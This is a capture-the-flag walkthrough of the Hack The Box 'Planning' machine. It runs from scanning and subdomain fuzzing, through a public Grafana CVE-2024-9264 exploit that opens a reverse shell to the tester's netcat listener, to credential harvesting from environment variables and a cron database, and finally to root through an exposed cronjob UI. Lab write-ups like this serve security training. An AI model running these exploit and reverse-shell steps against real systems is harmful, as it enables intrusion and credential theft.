- - - 
created : 11-08-2025 

Tags : #easy

Released on 10 May 2025 (Season 8)
- - - 
# Machine Information

As is common in real life pentests, you will start the Planning box with credentials for the following account: `admin / 0D5oT70Fq13EvB5r`
# Recon
## Rustscan - Nmap

First we add the target IP to our /etc/hosts file, then we use [Rustscan](../../../3%20-%20Tags/Hacking%20Tools/Rustscan.md) that will pass the result to [Nmap](../../../3%20-%20Tags/Hacking%20Tools/Nmap.md) with `--` :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Planning]
└─$ rustscan -a planning.htb -- -A 

Open 10.10.11.68:22
Open 10.10.11.68:80

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)

80/tcp open  http    syn-ack ttl 63 nginx 1.24.0 (Ubuntu)
|_http-title: Edukate - Online Education Website
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: nginx/1.24.0 (Ubuntu)

```
# Enumeration
## HTTP (80)

Main page :
![Pasted image 20250811192857.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250811192857.png)
### DirSearch

We'll use [Dirsearch](../../../3%20-%20Tags/Hacking%20Tools/Dirsearch.md) to start [Enumeration](../../../3%20-%20Tags/Hacking%20Concepts/Enumeration.md) on the [Website](../../../3%20-%20Tags/Hacking%20Concepts/Website.md) :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Planning]
└─$ dirsearch -u http://planning.htb 

[19:39:57] Starting: 
[19:40:00] 301 -  178B  - /js  ->  http://planning.htb/js/                  
[19:40:05] 200 -   12KB - /about.php                                        
[19:40:15] 200 -   10KB - /contact.php                                      
[19:40:16] 301 -  178B  - /css  ->  http://planning.htb/css/                
[19:40:21] 301 -  178B  - /img  ->  http://planning.htb/img/                
[19:40:22] 403 -  564B  - /js/                                              
[19:40:23] 403 -  564B  - /lib/                                             
[19:40:23] 301 -  178B  - /lib  ->  http://planning.htb/lib/      

Task Completed                 
```

Nothing interesting.
### Fuff

We use [FFuf](../../../3%20-%20Tags/Hacking%20Tools/FFuf.md) for [Subdomain](../../../3%20-%20Tags/Hacking%20Concepts/Subdomain.md) enum :

```bash                                                                                                 
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Planning]
└─$ ffuf -w ./fuzzDicts/subdomainDicts/main.txt - -H 'Host: FUZZ.planning.htb ' -u http://planning.htb  -fs 178 -c  

grafana                 [Status: 302, Size: 29, Words: 2, Lines: 3, Duration: 36ms]
```

We can add it to our /etc/hosts file and login in the page with the given creds :

![Pasted image 20250811223718.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250811223718.png)
# Exploit

[CVE-2024-9264](../../../3%20-%20Tags/CVEs/CVE-2024-9264.md) https://github-com.translate.goog/z3k0sec/CVE-2024-9264-RCE-Exploit?_x_tr_sl=auto&_x_tr_tl=en&_x_tr_hl=en

Usage :

```bash
python3 poc.py --url http://grafana.planning.htb --username admin --password 0D5oT70Fq13EvB5r --reverse-ip 10.10.14.174 --reverse-port 1337
```

First we start our [Netcat](../../../3%20-%20Tags/Hacking%20Tools/Netcat.md) listener :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Planning/CVE-2024-9264-RCE-Exploit]
└─$ nc -lvnp 1337
listening on [any] 1337 ...
```

Now we run the command and we have a root shell :

```
# whoami
root
# ls
LICENSE
bin
conf
public
rev.php
```

We can see we are in a Docker environment, we find creds for `enzo` :

```bash
# env
GF_PATHS_HOME=/usr/share/grafana
HOSTNAME=7ce659d667d7
AWS_AUTH_EXTERNAL_ID=
SHLVL=1
HOME=/usr/share/grafana
OLDPWD=/home
AWS_AUTH_AssumeRoleEnabled=true
GF_PATHS_LOGS=/var/log/grafana
_=ls
GF_PATHS_PROVISIONING=/etc/grafana/provisioning
GF_PATHS_PLUGINS=/var/lib/grafana/plugins
PATH=/usr/local/bin:/usr/share/grafana/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
AWS_AUTH_AllowedAuthProviders=default,keys,credentials
GF_SECURITY_ADMIN_PASSWORD=  'HTB{{REDACTED_PASSWD}}'
AWS_AUTH_SESSION_DURATION=15m
GF_SECURITY_ADMIN_USER=enzo
GF_PATHS_DATA=/var/lib/grafana
GF_PATHS_CONFIG=/etc/grafana/grafana.ini
AWS_CW_LIST_METRICS_PAGE_LIMIT=500
PWD=/
```
## SSH (22)

We can access on [SSH](../../../3%20-%20Tags/Hacking%20Concepts/SSH.md) with new credentials for the user flag :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Planning/CVE-2024-9264-RCE-Exploit]
└─$ ssh enzo@planning.htb
enzo@planning.htb password: 

enzo@planning:~$ ls
user.txt
enzo@planning:~$ cat user.txt
 HTB{{REDACTED_FLAG}}
```
# Privilege Escalation
## LinPEAS

We can start [Privilege Escalation](../../../3%20-%20Tags/Hacking%20Concepts/Privilege%20Escalation.md) running [LinPEAS](../../../3%20-%20Tags/Hacking%20Tools/LinPEAS.md) on the target machine, first we copy the script via ssh :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Planning/CVE-2024-9264-RCE-Exploit]
└─$ scp linpeas.sh enzo@planning.htb:/tmp/
enzo@planning.htb password: 
linpeas.sh                                                      100%  131KB 319.0KB/s   00:00
```

Now we run it :

```bash
enzo@planning:/tmp$ ./linpeas.sh 


[+] Active Ports
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#internal-open-ports               
Active Internet connections (servers and established)                                             
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.54:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:36149         0.0.0.0:*               LISTEN      -                   
tcp        0      0 10.10.11.68:36038       10.10.16.37:4433        ESTABLISHED 7881/uCEnp          
tcp        0      0 172.17.0.1:34608        172.17.0.2:3000         FIN_WAIT2   -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0   3896 10.10.11.68:22          10.10.14.174:51720      ESTABLISHED -                   
udp        0      0 127.0.0.54:53           0.0.0.0:*                           -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 10.10.11.68:35328       1.1.1.1:53              ESTABLISHED 21287/bash          

[+] Looking for tables inside readable .db/.sqlite files (limit 100)
 -> Extracting tables from /var/lib/command-not-found/commands.db (limit 20)                                               
                                                                                                                           
 -> Extracting tables from /var/lib/fwupd/pending.db (limit 20)
                                                                                                                           
 -> Extracting tables from /var/lib/PackageKit/transactions.db (limit 20)
                                                                                                                           
 -> Extracting tables from /opt/crontabs/crontab.db (limit 20)
```

the file **/opt/crontabs/crontab.db** can have credentials or open a new attack vector so i opened it :

```
enzo@planning:/$ cat /opt/crontabs/crontab.db                                                                              

{"name":"Grafana backup","command":"/usr/bin/docker save root_grafana -o /var/backups/grafana.tar && /usr/bin/gzip /var/backups/grafana.tar && zip -P  HTB{{REDACTED_PASSWD}} /var/backups/grafana.tar.gz.zip /var/backups/grafana.tar.gz && rm /var/backups/grafana.tar.gz","schedule":"@daily","stopped":false,"timestamp":"Fri Feb 28 2025 20:36:23 GMT+0000 (Coordinated Universal Time)","logging":"false","mailing":{},"created":1740774983276,"saved":false,"_id":"GTI22PpoJNtRKg0W"}
{"name":"Cleanup","command":"/root/scripts/cleanup.sh","schedule":"* * * * *","stopped":false,"timestamp":"Sat Mar 01 2025 17:15:09 GMT+0000 (Coordinated Universal Time)","logging":"false","mailing":{},"created":1740849309992,"saved":false,"_id":"gNIRXh1WIc9K7BYX"}
```

We have a password, but it's not for the root user on the system. 
## Port Forwarding

[LinPEAS](../../../3%20-%20Tags/Hacking%20Tools/LinPEAS.md) also found open ports which can have **local hosted Websites**, to be able to access that we have to do port forwarding :

```bash                                                                                                                          
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Planning/CVE-2024-9264-RCE-Exploit]
└─$ ssh -L 8000:127.0.0.1:8000 enzo@planning.htb -N

enzo@planning.htb's password: 
```

Now we can access, we have a Cronjobs UI so we can create a new Cronjob :

![Pasted image 20250811232659.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250811232659.png)

this command will copy the text in the root flag **/root/root.txt** to a file named root in the /tmp folder, after creating the script all we got to do is to click **Run now button** and check on [SSH](../../../3%20-%20Tags/Hacking%20Concepts/SSH.md) :

```
enzo@planning:/tmp$ cat root 
 HTB{{REDACTED_FLAG}}
```

Pwned !!